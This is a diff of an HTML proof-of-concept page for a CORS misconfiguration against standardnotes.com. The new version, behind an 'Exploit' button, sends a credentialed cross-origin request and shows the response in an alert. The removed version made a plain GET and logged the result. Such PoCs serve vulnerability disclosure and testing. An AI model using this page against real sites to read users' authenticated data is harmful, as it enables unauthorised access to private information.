@@ -1,33 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploitation PoC</title>
-</head>
-<body>
-
-<script>
-    // Replace this URL with the target URL you are testing
-    const targetUrl = 'https://app.standardnotes.com/';
-
-    // Create a new XMLHttpRequest object
-    const xhr = new XMLHttpRequest();
-
-    // Specify the type of request (GET, POST, etc.) and the target URL
-    xhr.open('GET', targetUrl, true);
-
-    // Set a callback function to handle the response
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4 && xhr.status == 200) {
-            // The response from the server
-            console.log(xhr.responseText);
-        }
-    };
-
-    // Send the request
-    xhr.send();
-</script>
-
-</body>
-</html>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://standardnotes.com", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
